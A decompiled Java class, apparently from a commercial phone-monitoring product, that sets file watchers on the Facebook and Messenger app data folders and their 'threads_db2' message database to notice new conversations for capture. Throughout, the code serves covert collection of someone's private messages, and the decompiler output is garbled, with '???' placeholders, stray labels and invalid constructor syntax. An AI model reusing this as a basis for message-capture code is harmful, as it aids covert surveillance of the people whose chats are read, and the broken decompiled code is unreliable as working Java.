package com.vvt.capture.b.a;

import com.vvt.base.capture.h;
import com.vvt.capture.b.c.a.b;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;
import java.util.HashSet;
import java.util.Iterator;

public class d
  implements m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private static d g;
  private j d;
  private HashSet e;
  private boolean f;
  private com.vvt.capture.b.d h;
  private HashSet i;
  
  private d()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.i = localHashSet;
  }
  
  public static d a()
  {
    synchronized (d.class)
    {
      d locald = g;
      if (locald == null)
      {
        locald = new com/vvt/capture/b/a/d;
        locald.<init>();
        g = locald;
      }
      locald = g;
      return locald;
    }
  }
  
  private void a(HashSet paramHashSet)
  {
    if (paramHashSet != null) {
      try
      {
        Iterator localIterator = paramHashSet.iterator();
        boolean bool1;
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          Object localObject = localIterator.next();
          localObject = (f)localObject;
          boolean bool2 = a;
          if (bool2) {}
          ((f)localObject).stopWatching();
          localIterator.remove();
        }
        return;
      }
      catch (Exception localException)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      paramHashSet.clear();
    }
  }
  
  private void e()
  {
    boolean bool = true;
    this.f = bool;
    Object localObject = this.e;
    if (localObject == null)
    {
      localObject = new java/util/HashSet;
      ((HashSet)localObject).<init>();
      this.e = ((HashSet)localObject);
      localObject = this.d;
      if (localObject == null)
      {
        localObject = j.a();
        this.d = ((j)localObject);
      }
      bool = a;
      if (bool) {}
      localObject = this.d;
      String str = "com.facebook.katana";
      ((j)localObject).a(str, this);
      bool = a;
      if (bool) {}
      localObject = this.d;
      str = "com.facebook.orca";
      ((j)localObject).a(str, this);
    }
  }
  
  private void f()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.f = false;
    Object localObject = this.e;
    a((HashSet)localObject);
    localObject = this.d;
    if (localObject != null)
    {
      this.d.a("com.facebook.katana");
      localObject = this.d;
      String str = "com.facebook.orca";
      ((j)localObject).a(str);
    }
    this.e = null;
  }
  
  private void g()
  {
    boolean bool1 = true;
    boolean bool2 = false;
    ??? = null;
    com.vvt.capture.b.d locald;
    try
    {
      boolean bool3 = a;
      if (bool3) {}
      int j = b.b();
      boolean bool5 = a;
      if ((bool5) && (j != 0)) {
        break label279;
      }
      locald = a.b();
      if (locald == null) {
        break label268;
      }
      localObject1 = this.h;
      if (localObject1 == null)
      {
        this.h = locald;
        if (!bool1) {
          break label268;
        }
        bool1 = b;
        if (bool1) {}
        synchronized (this.i)
        {
          Object localObject2 = this.i;
          localObject1 = ((HashSet)localObject2).iterator();
          bool1 = ((Iterator)localObject1).hasNext();
          if (!bool1) {
            break label266;
          }
          localObject2 = ((Iterator)localObject1).next();
          localObject2 = (h)localObject2;
          ((h)localObject2).a();
        }
      }
      localObject1 = locald.g();
    }
    finally {}
    Object localObject7 = this.h;
    localObject7 = ((com.vvt.capture.b.d)localObject7).g();
    boolean bool6 = ((String)localObject1).equals(localObject7);
    long l1 = locald.h();
    Object localObject1 = this.h;
    long l2 = ((com.vvt.capture.b.d)localObject1).h();
    boolean bool4 = l1 < l2;
    label213:
    Object localObject5;
    if (bool4)
    {
      bool4 = bool1;
      boolean bool7 = a;
      if ((bool7) && (!bool6)) {
        break label253;
      }
      bool1 = false;
      localObject5 = null;
    }
    for (;;)
    {
      bool2 = a;
      if (!bool2) {
        break;
      }
      break;
      bool4 = false;
      localObject1 = null;
      break label213;
      label253:
      if (!bool4)
      {
        bool1 = false;
        localObject5 = null;
      }
    }
    for (;;)
    {
      label266:
      label268:
      bool1 = a;
      if (bool1) {}
      return;
      label279:
      bool1 = b;
      if (bool1) {}
      synchronized (this.i)
      {
        localObject5 = this.i;
        localObject1 = ((HashSet)localObject5).iterator();
        bool1 = ((Iterator)localObject1).hasNext();
        if (bool1)
        {
          localObject5 = ((Iterator)localObject1).next();
          localObject5 = (h)localObject5;
          ((h)localObject5).a();
        }
      }
    }
  }
  
  public void a(h paramh)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.i)
    {
      HashSet localHashSet2 = this.i;
      bool = localHashSet2.contains(paramh);
      if (!bool)
      {
        localHashSet2 = this.i;
        localHashSet2.add(paramh);
      }
      e();
      bool = a;
      if (bool) {}
      return;
    }
  }
  
  public void a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    try
    {
      Object localObject = this.e;
      Iterator localIterator = ((HashSet)localObject).iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        localObject = (f)localObject;
        if (localObject != null)
        {
          String str = ((f)localObject).a();
          boolean bool2 = str.contains(paramString);
          if (bool2)
          {
            bool2 = a;
            if (bool2) {}
            ((f)localObject).stopWatching();
            localIterator.remove();
          }
        }
      }
      return;
    }
    catch (Exception localException)
    {
      bool1 = c;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.i)
    {
      Object localObject1 = this.i;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      bool = localIterator.hasNext();
      if (bool)
      {
        localObject1 = localIterator.next();
        localObject1 = (h)localObject1;
        ((h)localObject1).a(paramString1, paramString2);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(h paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    synchronized (this.i)
    {
      HashSet localHashSet2 = this.i;
      bool1 = localHashSet2.contains(paramh);
      if (bool1)
      {
        localHashSet2 = this.i;
        localHashSet2.remove(paramh);
      }
      localHashSet2 = this.i;
      int j = localHashSet2.size();
      boolean bool3 = a;
      if ((!bool3) || (j == 0)) {
        f();
      }
      boolean bool2 = a;
      if (bool2) {}
      return;
    }
  }
  
  public void b(String paramString1, String paramString2)
  {
    bool1 = a;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject1 = ((StringBuilder)localObject1).append(paramString2);
        localObject3 = File.separator;
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = "threads_db2";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject1 = ((StringBuilder)localObject1).toString();
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject1);
        bool2 = ((File)localObject3).exists();
        if (!bool2) {
          continue;
        }
        bool2 = b;
        if (bool2) {}
        localObject3 = new com/vvt/capture/b/a/f;
        int k = 2;
        ((f)localObject3).<init>(this, (String)localObject1, k);
        ((f)localObject3).startWatching();
        localObject1 = this.e;
        ((HashSet)localObject1).add(localObject3);
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject3;
        boolean bool2;
        Iterator localIterator;
        int j;
        boolean bool3;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
        bool1 = false;
        Object localObject2 = null;
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool2 = false;
      localObject3 = null;
      localObject1 = this.e;
      localIterator = ((HashSet)localObject1).iterator();
      bool1 = localIterator.hasNext();
      if (!bool1) {
        continue;
      }
      localObject1 = localIterator.next();
      localObject1 = (f)localObject1;
      if (localObject1 != null)
      {
        localObject1 = ((f)localObject1).a();
        bool1 = ((String)localObject1).contains(paramString1);
        if (bool1)
        {
          bool1 = true;
          bool2 = b;
          if ((!bool2) || (!bool1))
          {
            localObject1 = new com/vvt/capture/b/a/e;
            j = 256;
            ((e)localObject1).<init>(this, paramString2, j);
            bool3 = b;
            if (bool3) {}
            ((f)localObject1).startWatching();
            localObject3 = this.e;
            ((HashSet)localObject3).add(localObject1);
          }
        }
      }
    }
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */